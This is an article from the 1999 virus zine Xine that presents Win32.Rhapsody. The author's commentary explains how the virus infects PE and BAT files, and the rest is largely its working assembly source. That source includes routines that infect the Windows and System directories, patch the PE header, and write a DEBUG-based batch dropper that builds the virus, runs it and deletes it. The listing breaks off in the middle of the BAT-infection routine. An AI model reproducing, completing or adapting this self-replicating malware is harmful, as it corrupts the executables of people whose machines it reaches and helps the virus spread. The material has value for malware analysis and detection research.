
   ;                                             ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
   ;                                             ³ Xine - issue #5 - Phile 200 ³
   ;                                             ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ




   ;
   ;ÄÄÄÛÛÛÄÛÛÛÄÛÛÛÄÛÛÛÄÛÛÛÄ¿
   ; ÚÄÜÜÜÄÛÛÛÄÛÛÛÄÛÛÛÄÛÛÛÄÙ        [ Win32.Rhapsody   Billy Belcebu/iKX ]
   ; ÀÄÛÛÛÄÛÛÛÛÛÛÄÄÄÛÛÛÛÛÄÄ¿ ÚÄÄÄÄÄÄ[ 2619 bytes    Target - PE/BAT (R3) ]ÄÄÄÄÄÄ
   ; ÚÄÛÛÛÄÛÛÛÄÛÛÛÄÛÛÛÄÛÛÛÄÙ ³      [ 24/09/99 - Made in Valencia, Spain ]
   ; ÀÄÛÛÛÄÛÛÛÄÛÛÛÄÛÛÛÄÛÛÛÄÄÄÙ
   ;
   ;
   ;
   ; [ Introduction ]
   ;
   ; Welcome to Rhapsody. It's a runtime infector, that infects PE (EXE/CPL/SCR)
   ; executables, as well  as BAT files. It  infects PE using the File  Mapping,
   ; also BAT files (k00l!!!). Btw, don't expect  optimization on  this virus. I
   ; was bored of that too, so i didn't take care too much in that. The virus is
   ; simple in all its aspects, it has  been developed  to show a possibility to
   ; infect BAT  files in  Win32 viruses. I am  also  thinking of write a multi-
   ; platform virus via batch files, but i still don't know if it'll be worth to
   ; do that effort (because i  forgot *ALL* about DOS  coding, anything else ;)
   ; If you ask  me for  any parameter  of the Int21h and i wouldn't be  able to
   ; answer ;)
   ;
   ; [ PE infection ]
   ;
   ; I've rebuilded my way of approaching the  infection of the PE file a little
   ; since my previous viruses. Even though, i've decided not to make the infec-
   ; ted file to preserve its  attributes, its time, etc. Well, the PE files are
   ; infected via two different  ways, depending of  the existence of the .reloc
   ; section. Both methods have in common the  fact that i nulify all the fixups
   ; in the PE header, for avoid problems.
   ;
   ; If .reloc section is the last,what we do is to change it's name to Rhapsody
   ; and later we fill with proper data all  the section fields. We make the EIP
   ; (of the PE header) to point to the virus code, and that's all. In some lar-
   ; ge files, the file won't grow, because  the .reloc is  even bigger than the
   ; virus code. Thanx to b0z0/iKX for his great  tute 'Ideas and theoryes on PE
   ; infection',that has been of great help in this part of the virus (the idea,
   ; not the code ;). Even, sometimes, the file size decreases after infection!.
   ; You have an example in explorer.exe :)
   ;
   ; If .reloc isn't  the last section, we infect  the file via the usual method
   ; of increase  the  last  section size, the so called  29A technique (damn, i
   ; don't like  to say so, but it's the  real truth: Jacky  invented it, and we
   ; must call that method as the author wanted... he deserves it!).
   ;
   ; [ BAT infection ]
   ;
   ; I imagine you are wondering how the fuck i infect the BAT files. Well, it's
   ; very easy: using DEBUG. So, the infected BAT files will be as follows:
   ;
   ; @echo off
   ; goto over_script
   ; N C:\RHAPSODY.SYS
   ; E 0000 12 D3 3A 9F DA CB BB 5A 7A DE 32 7F 23 12 DB AF
   ; E 0010 DA CB BB 5A 7A DE 32 7F 23 12 DB AF D3 3A 9F DA
   ; [...]
   ; RCX
   ; 0A37
   ; W
   ; Q
   ; :over_script
   ; debug < 0% >nul
   ; copy C:\RHAPSODY.SYS C:\RHAPSODY.EXE >nul
   ; C:\RHAPSODY.EXE >nul
   ; del C:\RHAPSODY.SYS >nul
   ; del C:\RHAPSODY.EXE >nul
   ; echo on
   ; ... Old BAT code goes here ...
   ;
   ; Of course, all the  values here  are invented. What  we'll drop at the file
   ; C:\RHAPSODY.SYS is an infected copy of Win32.Rhapsody. We will rename it to
   ; EXE, so we are able  execute it, and finally we  execute it. After that, we
   ; delete both RHAPSODY.SYS and RHAPSODY.EXE. The problem could be in DOS, be-
   ; cause our dropper is a Win32 executable, so  the message 'This program must
   ; be run in Win32' could appear, but i  avoided it: as the  dos stub is a dos
   ; program (showing a lame message) we can  redirect it to NUL device as well.
   ; So, if the BAT file is executed in DOS, nothing would  happen, but if it is
   ; executed in a  Win32  enviroment, the virus  dropper  will  be  executed ;)
   ; The virus doesn't reinfect the file, it  checks  at  the beginning for  the
   ; smilie at the beginning of the batch ':D'
   ; This thing of BAT infection don't pretend to make the virus to be  more wi-
   ; despread, it's only one thing i had in mind and i wanted to add.Just a cool
   ; feature for be seen in an AVPVE description, don't you think? :)
   ;
   ; My algorithm of  BAT  infection  is a  bit messy: it  requires  many memory
   ; allocations and deallocations, the code  is ununderstandable and  had to be
   ; rebuilt many  times. So, don't  try  to copy  code from  there, it's almost
   ; impossible (even I, the  maker of  the code, use  to be  lost when taking a
   ; look to it).
   ;
   ; The bad point of  this method  is the  speed while  creating the dr0pper of
   ; debug, and the fact that  we depend  of such executable. Well, it's present
   ; even in NT, so i think there won't be any problem.
   ;
   ; [ Why Rhapsody? ]
   ;
   ; This has two parts: why i made  the virus, and why i called it in that way.
   ; Let's do it step by step.
   ;
   ; I was a bit tired of megainfectors (really, spend  almost one month develo-
   ; ping my Win32.Legacy has toasted my few neurons), and i  was in  a day with
   ; a lack of ideas (it's not normal  in me, almost  everyday i am thinking new
   ; ideas for my viruses), so i began to  drink some vodka, tequila, etc (fina-
   ; lly i ended  with the blessed  kalimotxo, i hadn't more  money!), and smoke
   ; that coolio thing called... guess how? yeah, ganja. ;) The day  after, with
   ; the fucking headache i had, i went to my swimming pool (i was at my holyday
   ; place, where i written my Legacy, and my  guides for MS-DOS and Win32), and
   ; the idea come to my mind suddendly  while i was in the cold water. I had to
   ; write a Win32/BAT virus :)
   ;
   ; About the name, if you know  a bit the scene of epic/medieval metal, you'll
   ; surely heard that band called Rhapsody (hi Inty!). They've excellent songs,
   ; such as that hymn called 'Emerald Sword'. If you hear them you'll experime-
   ; nt a travel to a place where dragons  scare the humans, where is a war bet-
   ; ween the good and  the bad, where the  honour has the same value of a human
   ; life. Ok, adventurer. You that  ride  the  winds  of  wisdom... Defeat  the
   ; master of chaos in the name of the honor and justice!
   ;
   ; [ Greetings ]
   ;
   ; Mmm... this time i will only greet all the iKX crew, Benny/29A & Qozah/29A,
   ; because the friendship  they demonstrated across hard  times. Thanx you all
   ; guys. I'd give all for you, you know. And a greet here to ULTRAS/[MaTRiX],
   ; coz he betatested this, and notified me a minor thing i forgot to do :P
   ;
   ; (c) 1999 Billy Belcebu/iKX

           .586p
           .model  flat,stdcall

   extrn   ShellAboutA:PROC
   extrn   ExitProcess:PROC
   extrn   GetLastError:PROC

                   .data

   szMessage1      db      "Win32.Rhapsody v1.00#Win32.Rhapsody",0
   szMessage2      db      "(C) 1999 Billy Belcebu/iKX",0

                   .code

   W32Rhapsody:
           jmp     virus
   FakeHost:
           call    ShellAboutA,00h,offset szMessage1,offset szMessage2,00h
           call    ExitProcess,00h

   ; [ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ]
   ; [ Win32.Rhapsody                                                          ]
   ; [ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ]

   Rhapsody        segment dword use32 public 'Rhapsody'

   d               equ     <[ebp]-offset delta>

   virus_size      equ     virus_end-virus_start
   heap_size       equ     heap_end-virus_end
   total_size      equ     virus_size+heap_size

   virus_start     label   byte
   virus:
           jmp     over_virus_data

   ; [ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ]
   ; [ Some virus data                                                         ]
   ; [ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ]

   bat_inf1        label   byte
                   db      ":D",13,10              ; <-- Inf mark ;)
                   db      "@echo off",13,10
                   db      "goto over_script",13,10
                   db      "N C:\RHAPSODY.SYS",13,10
   n_bat_inf1      =       ($-offset bat_inf1)

   bat_inf2        label   byte
                   db      "RCX",13,10
   src_bytes       db      "0000",13,10
                   db      "W",13,10
                   db      "Q",13,10
                   db      ":over_script",13,10
                   db      "debug <%0 >nul",13,10
                   db      "copy C:\RHAPSODY.SYS C:\RHAPSODY.EXE >nul",13,10
                   db      "C:\RHAPSODY.EXE >nul",13,10
                   db      "del C:\RHAPSODY.SYS >nul",13,10
                   db      "del C:\RHAPSODY.EXE >nul",13,10
                   db      "echo on",13,10
   n_bat_inf2      =       ($-offset bat_inf2)

   temp_file       db      "RHAPSODY.W32",0

   SEARCH_MASK     db      "*.*",0

   AddressTableVA          dd      00000000h
   NameTableVA             dd      00000000h
   OrdinalTableVA          dd      00000000h
   kernel                  dd      00000000h
   TmpModuleBase           dd      00000000h
   lpThreadId              dd      00000000h
   GlobalAllocHandle       dd      00000000h
   GlobalAllocHandle2      dd      00000000h
   GlobalAllocHandle3      dd      00000000h
   SearchHandle            dd      00000000h
   FileHandle              dd      00000000h
   FileHandle2             dd      00000000h
   FileHandle3             dd      00000000h
   MapAddress              dd      00000000h
   MapAddress2             dd      00000000h
   MapHandle               dd      00000000h
   MapHandle2              dd      00000000h
   NumOfBytesWritten       dd      00000000h
   InfDropperSize          dd      00000000h
   Counter                 dw      0000h

   over_virus_data:

   ; [ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ]
   ; [ Get delta offset :)                                                     ]
   ; [ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ]

           call    delta
   delta:  pop     ebp

   ; [ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ]
   ; [ CRC32 of APIs used by the virus                                         ]
   ; [ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ]

           jmp     over_virus_apis

   apiCRC32                label   byte
   @FindFirstFileA         dd      0AE17EBEFh
   @FindNextFileA          dd      0AA700106h
   @FindClose              dd      0C200BE21h
   @CreateFileA            dd      08C892DDFh
   @DeleteFileA            dd      0DE256FDEh
   @SetFilePointer         dd      085859D42h
   @SetFileAttributesA     dd      03C19E536h
   @CloseHandle            dd      068624A9Dh
   @GetCurrentDirectoryA   dd      0EBC6C18Bh
   @SetCurrentDirectoryA   dd      0B2DBD7DCh
   @GetWindowsDirectoryA   dd      0FE248274h
   @GetSystemDirectoryA    dd      0593AE7CEh
   @CreateFileMappingA     dd      096B2D96Ch
   @MapViewOfFile          dd      0797B49ECh
   @UnmapViewOfFile        dd      094524B42h
   @SetEndOfFile           dd      059994ED6h
   @GetFileSize            dd      0EF7D811Bh
   @ReadFile               dd      054D8615Ah
   @WriteFile              dd      021777793h
   @CreateThread           dd      019F33607h
   @ExitThread             dd      0058F9201h
   @WaitForSingleObject    dd      0D4540229h
   @GlobalAlloc            dd      083A353C3h
   @GlobalFree             dd      05CDF6B6Ah
   n_NeededAPIs            =       (($-offset apiCRC32)/4)

   ; [ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ]
   ; [ Virus copyright ;)                                                      ]
   ; [ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ]

           db      00h,"[Win32/BAT.Rhapsody]",00h
           db      00h,"(c) 1999 Billy Belcebu/iKX",00h

   ; [ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ]
   ; [ The virus code goes here                                                ]
   ; [ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ]

   over_virus_apis:
           mov     esi,ebp
           call    CheckImageBase
           jecxz   ExitVirusExecution

           mov     ModBase d,esi

           mov     esi,[esp]
           call    CheckImageBase
           jecxz   ExitVirusExecution

           mov     kernel d,esi

           lea     eax,apiCRC32 d
           xchg    esi,eax
           lea     edi,api_addresses d
           push    n_NeededAPIs
           pop     ecx
           call    GetAPIs

           lea     eax,lpThreadId d
       push    eax                             ; lpThreadId
           cdq
       push    edx                             ; dwCreationFlags
       push    ebp                             ; lpParameter
           lea     eax,VirusThread d
       push    eax                             ; lpStartAddress
       push    edx                             ; dwStackSize
       push    edx                             ; lpThreadAttributes
           call    CreateThread d

           xor     ecx,ecx
           dec     ecx
           push    ecx
           push    eax
           call    WaitForSingleObject d

   ExitVirusExecution:
           mov     eax,00400000h
   ModBase =       $-4
           add     eax,00001000h+(FakeHost-W32Rhapsody)
   OldEIP  =       $-4
           jmp     eax

           db      00h,"Welcome to the enchanted lands...",00h

   ; [ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ]
   ; [ Virus Thread                                                            ]
   ; [ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ]

   VirusThread     proc    delta_offset:DWORD

           mov     ebp,delta_offset

           pushad

           call    over_seh
           mov     esp,[esp+08h]
           jmp     ExitVirusThreadSEH
   over_seh:
       xor     edx,edx
       push    dword ptr fs:[edx]
       mov     fs:[edx],esp

           lea     edi,current_directory d
           push    edi
           push    7Fh
           call    GetCurrentDirectoryA d

           lea     edi,infection_directory d
           push    7Fh
           push    edi
           call    GetWindowsDirectoryA d
           call    SetNewDir&InfectFilesInDirectory

           lea     edi,infection_directory d
           push    7Fh
           push    edi
           call    GetSystemDirectoryA d
           call    SetNewDir&InfectFilesInDirectory

           lea     edi,current_directory d
           push    edi
           call    SetCurrentDirectoryA d
           call    InfectFilesInDirectory

   ExitVirusThreadSEH:
       xor     edx,edx
       pop     dword ptr fs:[edx]
       pop     edx

       popad

   ExitVirusThread:
           push    00h
           call    ExitThread d
   VirusThread     endp

   ; [ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ]
   ; [ Infect all files in directory                                           ]
   ; [ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ]

   SetNewDir&InfectFilesInDirectory:
           lea     edi,infection_directory d
           push    edi
           call    SetCurrentDirectoryA d

   InfectFilesInDirectory:
           lea     eax,WIN32_FIND_DATA d
           push    eax
           lea     eax,SEARCH_MASK d
           push    eax
           call    FindFirstFileA d

           inc     eax
           jz      FailOccured
           dec     eax

           mov     SearchHandle d,eax
   SearchForMore:
           push    dword ptr [ebp+(ModBase-delta)]
           push    dword ptr [ebp+(OldEIP-delta)]

           lea     edi,WFD_szFileName d
           call    AnalyzeFileName
           jecxz   ItsNotGoodFile
           dec     ecx
           jecxz   ItIsPE
           call    InfectBAT
           jmp     ItsNotGoodFile
   ItIsPE:
           call    InfectPE
   ItsNotGoodFile:
           pop     dword ptr [ebp+(OldEIP-delta)]
           pop     dword ptr [ebp+(ModBase-delta)]

           lea     edi,WFD_szFileName d
           push    MAX_PATH
           pop     ecx
       xor     al,al
       rep     stosb

           lea     eax,WIN32_FIND_DATA d
       push    eax
           push    dword ptr [ebp+(SearchHandle-delta)]
           call    FindNextFileA d

           test    eax,eax
           jnz     SearchForMore

   CloseSearchHandle:
           push    dword ptr [ebp+(SearchHandle-delta)]
           call    FindClose d
   FailOccured:
           ret

   ; [ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ]
   ; [ Infect PE files                                                         ]
   ; [ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ]

   InfectPE:
           push    80h                             ; Destroy hostile attributes
           push    edi
           call    SetFileAttributesA d

           xor     eax,eax                         ; Open file for R/W
       push    eax
       push    eax
           push    03h
       push    eax
       inc     eax
       push    eax
           push    0C0000000h
           push    edi
           call    CreateFileA d

           inc     eax
           jz      ExitInfectPE
           dec     eax

           mov     FileHandle d,eax                ; Save handle of opened file

           push    eax

           push    00h
           push    eax
           call    GetFileSize d                   ; Get its size
           pop     ecx
           add     eax,total_size

           push    eax

           xor     ebx,ebx                         ; EBX = 0
           push    ebx
           push    eax                             ; push size
           push    ebx
           push    04h
           push    ebx
           push    ecx                             ; push handle
           call    CreateFileMappingA d

           pop     ecx                             ; ECX = Size to map

           test    eax,eax
           jz      CloseFileExitInfectPE

           mov     MapHandle d,eax

           xor     ebx,ebx
       push    ecx
           push    ebx
           push    ebx
           push    02h
           push    eax
           call    MapViewOfFile d

           test    eax,eax
           jz      UnMap&CloseMap&FileExitInfectPE

           mov     MapAddress d,eax

           mov     esi,[eax+3Ch]
           add     esi,eax

           cmp     word ptr [esi],"EP"
           jnz     UnMap&CloseMap&FileExitInfectPE

           mov     ebx,"pahR"
           mov     ecx,"ydos"

           cmp     dword ptr [esi+4Ch],ebx
           jz      UnMap&CloseMap&FileExitInfectPE

           mov     dword ptr [esi+4Ch],ebx

       mov     edi,esi

       movzx   eax,word ptr [edi+06h]
       dec     eax
       imul    eax,eax,28h
       add     esi,eax
       add     esi,78h
       mov     edx,[edi+74h]
       shl     edx,03h
           add     esi,edx                         ; ESI = Last section header
                                                   ; EDI = PE header

           or      [esi+24h],0A0000020h            ; New section attributes

           and     dword ptr [edi+0A0h],00h        ; Nulify fixups
           and     dword ptr [edi+0A4h],00h

           cmp     dword ptr [esi],"ler."
           jnz     RelocNotLast
           cmp     dword ptr [esi+4],"co"
           jnz     RelocNotLast

   ; Overwriting stage, .reloc is last section

           mov     dword ptr [esi],ebx             ; Set new section name to
           mov     dword ptr [esi+4],ecx           ; 'Rhapsody' also ;)

           and     dword ptr [esi+18h],00h         ; Clear PointerToRelocations
           and     word ptr [esi+20h],00h          ; Clear NumberOfRelocations

           push    dword ptr [esi+14h]             ; Where copy virus

           mov     eax,virus_size
           mov     [esi+08h],eax                   ; VirtualSize -> virus size
           mov     ecx,[edi+3Ch]                   ; ECX = Alignment

           cdq                                     ; Align, sucker
           push    eax
           div     ecx
           pop     eax
           sub     ecx,edx
           add     eax,ecx

           mov     [esi+10h],eax                   ; SizeOfRawData -> aligned
                                                   ;                  virus size

           mov     eax,[esi+10h]                   ; Fix ImageSize to allow it
           add     eax,[esi+0Ch]                   ; to work in NT :P
           mov     [edi+50h],eax

           mov     eax,[esi+0Ch]                   ; New EIP
           xchg    eax,[edi+28h]                   ; Put new EIP and get old one
           mov     OldEIP d,eax                    ; Save it

           pushad

           mov     eax,[esi+14h]                   ; EDX = Where truncate
           add     eax,[esi+10h]
           mov     ecx,[edi+3Ch]

           cdq                                     ; Align, sucker
           push    eax
           div     ecx
           pop     eax
           sub     ecx,edx
           add     eax,ecx

           mov     [esp.PUSHAD_EDX],eax

           popad

           pop     edi
           add     edi,dword ptr [ebp+(MapAddress-delta)]
           lea     esi,virus_start d
           mov     ecx,virus_size
           rep     movsb

           jmp     Trunc&UnMap&CloseMap&FileExitInfectPE

   ; Normal stage, .reloc not last or not present

   RelocNotLast:
           mov     edx,[esi+10h]
           mov     ebx,edx
           add     edx,[esi+14h]

           push    edx

           mov     eax,ebx
           add     eax,[esi+0Ch]
           xchg    [edi+28h],eax                   ; Put new EIP
           mov     OldEIP d,eax

           mov     eax,[esi+10h]
           add     eax,virus_size
           mov     ecx,[edi+3Ch]

           cdq                                     ; Align, sucker
           push    eax
           div     ecx
           pop     eax
           sub     ecx,edx
           add     eax,ecx

           mov     [esi+10h],eax
           mov     [esi+08h],eax
           xchg    eax,edx

           mov     eax,[esi+10h]
           add     eax,[esi+0Ch]
           mov     [edi+50h],eax

           add     edx,[esi+14h]

           pop     edi

           lea     esi,virus_start d
           add     edi,dword ptr [ebp+(MapAddress-delta)]
           mov     ecx,virus_size
           rep     movsb

   Trunc&UnMap&CloseMap&FileExitInfectPE:
           xor     eax,eax
           push    eax
           push    eax
           push    edx
           push    dword ptr [ebp+(FileHandle-delta)]
           call    SetFilePointer d

           push    dword ptr [ebp+(FileHandle-delta)]
           call    SetEndOfFile d

   UnMap&CloseMap&FileExitInfectPE:
           push    dword ptr [ebp+(MapAddress-delta)]
           call    UnmapViewOfFile d

   CloseMap&FileExitInfectPE:
           push    dword ptr [ebp+(MapHandle-delta)]
           call    CloseHandle d

   CloseFileExitInfectPE:
           push    dword ptr [ebp+(FileHandle-delta)]
           call    CloseHandle d

   ExitInfectPE:
           ret

   ; [ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ]
   ; [ Infect BAT files                                                        ]
   ; [ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ]

   InfectBAT:

   ; BAT Infection, part 1

           xor     eax,eax                         ; Open BAT file for R/W
       push    eax
       push    eax
           push    03h
       push    eax
       inc     eax
       push    eax
           push    0C0000000h
           push    edi
           call    CreateFileA d

           inc     eax
           jz      ExitInfectBAT
           dec     eax

           mov     FileHandle2 d,eax

           push    eax

           push    00h
           push    eax
           call    GetFileSize d                   ; Get its size
           pop     ecx
           mov     Size2I d,eax

           pushad
           push    eax
           push    00h
           call    GlobalAlloc d                   ; Get a place where store it
           mov     GlobalAllocHandle d,eax

       push    00h
           lea     ecx,NumOfBytesWritten d
           push    ecx
           push    dword ptr [ebp+(Size2I-delta)]
           push    eax
           push    dword ptr [ebp+(FileHandle2-delta)]
           call    ReadFile d                      ; Save actual BAT contents
           popad

           add     eax,2000h*4

           push    eax

           xor     ebx,ebx                         ; EBX = 0
           push    ebx
           push    eax                             ; push size
           push    ebx
           push    04h
           push    ebx
           push    ecx                             ; push handle
           call    CreateFileMappingA d

           pop     ecx                             ; ECX = Size to map

           test    eax,eax
           jz      CloseAndExitInfectBAT

           mov     MapHandle2 d,eax

           xor     ebx,ebx
       push    ecx
           push    ebx
           push    ebx
           push    02h
           push    eax
           call    MapViewOfFile d

           test    eax,eax
           jz      UnMap&CloseMap&FileExitInfectBAT

           mov     MapAddress2 d,eax

           cmp     word ptr [eax],"D:"             ; Don't reinfect BAT
           jz      UnMap&CloseMap&FileExitInfectBAT

   ; BAT Infection, part 2

           push    4096d                           ; Alloc some memory more
           push    00h
           call    GlobalAlloc d
           mov     GlobalAllocHandle3 d,eax

           call    over_dr0p
   dr0p:   db      04Dh, 05Ah, 050h, 000h, 001h, 000h, 002h, 000h
           db      003h, 000h, 004h, 000h, 001h, 000h, 00Fh, 000h
           db      001h, 000h, 0FFh, 0FFh, 000h, 002h, 000h, 0B8h
           db      000h, 007h, 000h, 040h, 000h, 001h, 000h, 01Ah
           db      000h, 022h, 000h, 001h, 000h, 002h, 000h, 0BAh
           db      010h, 000h, 001h, 000h, 00Eh, 01Fh, 0B4h, 009h
           db      0CDh, 021h, 0B8h, 001h, 04Ch, 0CDh, 021h, 090h
           db      090h, 054h, 068h, 069h, 073h, 020h, 070h, 072h
           db      06Fh, 067h, 072h, 061h, 06Dh, 020h, 06Dh, 075h
           db      073h, 074h, 020h, 062h, 065h, 020h, 072h, 075h
           db      06Eh, 020h, 075h, 06Eh, 064h, 065h, 072h, 020h
           db      057h, 069h, 06Eh, 033h, 032h, 00Dh, 00Ah, 024h
           db      037h, 000h, 088h, 000h, 050h, 045h, 000h, 002h
           db      000h, 04Ch, 001h, 004h, 000h, 001h, 000h, 023h
           db      027h, 0BBh, 0B5h, 000h, 008h, 000h, 0E0h, 000h
           db      001h, 000h, 08Eh, 081h, 00Bh, 001h, 002h, 019h
           db      000h, 001h, 000h, 002h, 000h, 003h, 000h, 004h
           db      000h, 007h, 000h, 010h, 000h, 003h, 000h, 010h
           db      000h, 003h, 000h, 020h, 000h, 004h, 000h, 040h
           db      000h, 002h, 000h, 010h, 000h, 003h, 000h, 002h
           db      000h, 002h, 000h, 001h, 000h, 007h, 000h, 003h
           db      000h, 001h, 000h, 00Ah, 000h, 006h, 000h, 050h
           db      000h, 003h, 000h, 004h, 000h, 006h, 000h, 002h
           db      000h, 005h, 000h, 010h, 000h, 002h, 000h, 020h
           db      000h, 004h, 000h, 010h, 000h, 002h, 000h, 010h
           db      000h, 006h, 000h, 010h, 000h, 00Ch, 000h, 030h
           db      000h, 002h, 000h, 054h, 000h, 01Ch, 000h, 040h
           db      000h, 002h, 000h, 00Ch, 000h, 053h, 000h, 043h
           db      04Fh, 044h, 045h, 000h, 005h, 000h, 010h, 000h
           db      003h, 000h, 010h, 000h, 003h, 000h, 002h, 000h
           db      003h, 000h, 006h, 000h, 00Eh, 000h, 020h, 000h
           db      002h, 000h, 0E0h, 044h, 041h, 054h, 041h, 000h
           db      005h, 000h, 010h, 000h, 003h, 000h, 020h, 000h
           db      007h, 000h, 008h, 000h, 00Eh, 000h, 040h, 000h
           db      002h, 000h, 0C0h, 02Eh, 069h, 064h, 061h, 074h
           db      061h, 000h, 003h, 000h, 010h, 000h, 003h, 000h
           db      030h, 000h, 003h, 000h, 002h, 000h, 003h, 000h
           db      008h, 000h, 00Eh, 000h, 040h, 000h, 002h, 000h
           db      0C0h, 02Eh, 072h, 065h, 06Ch, 06Fh, 063h, 000h
           db      003h, 000h, 010h, 000h, 003h, 000h, 040h, 000h
           db      003h, 000h, 002h, 000h, 003h, 000h, 00Ah, 000h
           db      00Eh, 000h, 040h, 000h, 002h, 000h, 050h, 000h
           db      068h, 003h, 06Ah, 000h, 001h, 000h, 0E8h, 000h
           db      004h, 000h, 0FFh, 025h, 030h, 030h, 040h, 000h
           db      0F4h, 001h, 028h, 030h, 000h, 00Ah, 000h, 038h
           db      030h, 000h, 002h, 000h, 030h, 030h, 000h, 016h
           db      000h, 046h, 030h, 000h, 006h, 000h, 046h, 030h
           db      000h, 006h, 000h, 04Bh, 045h, 052h, 04Eh, 045h
           db      04Ch, 033h, 032h, 02Eh, 064h, 06Ch, 06Ch, 000h
           db      004h, 000h, 045h, 078h, 069h, 074h, 050h, 072h
           db      06Fh, 063h, 065h, 073h, 073h, 000h, 0AEh, 001h
           db      010h, 000h, 002h, 000h, 00Ch, 000h, 003h, 000h
           db      009h, 030h, 000h, 0F6h, 005h
   sdr0p   equ     ($-offset dr0p)
   over_dr0p:
           pop     esi
           mov     ecx,sdr0p
